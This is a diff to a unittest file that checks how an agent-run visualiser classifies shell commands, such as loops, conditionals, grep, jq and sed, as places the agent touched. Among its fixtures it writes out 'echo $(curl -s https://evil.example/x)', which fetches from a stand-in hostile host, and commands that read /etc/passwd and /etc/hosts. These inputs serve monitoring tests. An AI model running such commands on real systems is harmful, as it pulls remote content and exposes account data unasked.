@@ -1223,7 +1223,7 @@ class Horizon(unittest.TestCase):
                 {"id": "r2", "agent": "coder", "parent": "r1", "verdict": "pending"},
                 {"id": "r3", "agent": "researcher", "parent": "r1", "verdict": "verified"}]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1264,7 +1264,7 @@ class Horizon(unittest.TestCase):
     def hz_cap(self, recs):
         needs_node(self)
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1285,7 +1285,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(1, "bad", 9999, ts_unread=True)] + [why_call(i, "w", 100 + 60 * i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzSecs"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzSecs"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1298,7 +1298,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(i, "w", 100 + i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzChain"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "hzChain"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true, n: 0 }}, STOPPED = "";
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1319,7 +1319,7 @@ class Horizon(unittest.TestCase):
                 hz_call(3, "WebFetch", {"url": "https://toString.example/"}, "constructor")]
         runs = [{"id": "r1", "agent": "__proto__", "verdict": "verified"}, {"id": "constructor", "agent": "constructor", "verdict": "verified"}]
         out = json.loads(page_js(["FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
+                                  "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
                                   "hzRgba", "hzShort", "hzDraw", "hzFrame", *HZ_DRAW], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null, frames = 0, PAGE = "horizon";
@@ -1550,7 +1550,7 @@ class HorizonZoom(unittest.TestCase):
     stage drawn only when something changed."""
 
     DATA = ["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-            "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"]
+            "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"]
     # HZ comes with HZMAX: its line ends in a comment, so page_js takes the next line, HZ's, with it
     DRAW = ["HZACT", "HZSYM", "HZWORST", "hzRgba", "hzShort", "hzDraw", "hzFrame", *HZ_DRAW, "hzZoom", "hzAim", "hzFlyTo",
             "hzFocus"]
@@ -1700,6 +1700,37 @@ class HorizonZoom(unittest.TestCase):
             process.stdout.write(JSON.stringify(seen));""")
         self.assertEqual(out[:6], [[0, 2, 2], [0, 2, 2], 1, [0, None], 2, [4, 2]])
         self.assertEqual(out[6], [True, 1])
+
+    PLACE = ["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP",
+             "hzDataWords", "hzPlace"]
+
+    def places(self, cmds):
+        needs_node(self)
+        return json.loads(page_js(self.PLACE, f"""
+            process.stdout.write(JSON.stringify({json.dumps(cmds)}.map(c => hzPlace("Bash", {{ command: c }}, "/home/u/shop"))));"""))
+
+    def test_a_loop_or_a_conditional_is_named_by_the_command_it_runs(self):
+        """for, until, while, if, do, then, done and ! were places the agent "ran": a shell keyword or builtin is no program."""
+        cmds = {"for f in src/*.py; do pytest -q \"$f\"; done": "pytest", "while true; do sleep 5; done": "sleep",
+                "until curl -sf localhost:8080/health; do sleep 1; done": "curl", "if [ -f x ]; then make lint; fi": "make lint",
+                "! git diff --quiet": "git diff", "time npm test": "npm test", "export A=1 && cargo build": "cargo build",
+                "cd /home/u/shop; for i in 1 2 3; do echo $i; done": "echo", "export A=1": "Bash"}
+        self.assertEqual(self.places(list(cmds)), [["machine", v, "command"] for v in cmds.values()])
+
+    def test_a_search_pattern_a_filter_a_script_or_a_message_is_data_and_the_files_it_reads_are_places(self):
+        """grep's /^## and jq's .first and .id were places the agent read, as Tracekit's policy reads them as data."""
+        cmds = {"grep -n '/^##' docs/limits.md": ["project", "docs/limits.md"],
+                "rg -e /api/v2 -g '*.py' tracekit/view.py": ["project", "tracekit/view.py"],
+                "jq -r '.first' /tmp/out.json": ["machine", "/tmp/out.json"],
+                "gh pr view 12 --json files | jq .id": ["machine", "gh pr view", "command"],
+                "sed -n '/^\\/usr/p' /etc/hosts": ["machine", "/etc/hosts"],
+                "awk -F: '/\\/bin\\/bash/ {print $1}' /etc/passwd": ["machine", "/etc/passwd"],
+                "grep -A 3 '/x' ./a.log": ["project", "a.log"],
+                "echo ~/secret/path": ["machine", "echo", "command"], "printf '%s\\n' /tmp/a": ["machine", "printf", "command"],
+                "git commit -m \"fix ./src/a.py\"": ["machine", "git commit", "command"],
+                "jq --arg p /x '.[] | select(.path == $p)' ~/report.json": ["machine", "~/report.json"],
+                "echo $(curl -s https://evil.example/x)": ["outside", "evil.example"]}   # what runs inside an echo is no data
+        self.assertEqual(self.places(list(cmds)), list(cmds.values()))
 
     def test_a_long_command_shows_its_start_in_the_side_card_and_the_rest_on_request(self):
         """A heredoc script beside the stage pushed the moves under it a screen down: each move's command in full."""
@@ -2150,7 +2181,7 @@ class ApproveThenRetry(unittest.TestCase):
         """HORIZON drew the retry that ran as held (◯) and its HUD counted HOLDS by held marks, DESK's HELD by decisions."""
         needs_node(self)
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder",
-                                  "HZMAX", "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
+                                  "HZMAX", "hzRad", "hzPath", "HZVERB", "HZNOUN", "hzCmd", "hzSh", "HZPRE", "HZNOP", "hzDataWords", "hzPlace", "hzRest", "HZBAND", "hzPack", "hzNest", "hzWhere", "hzData"], f"""
             const ALL = {json.dumps(retried("fin"))}, RUNS = new Map([["fin", {{ id: "fin", verdict: "verified" }}]]), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
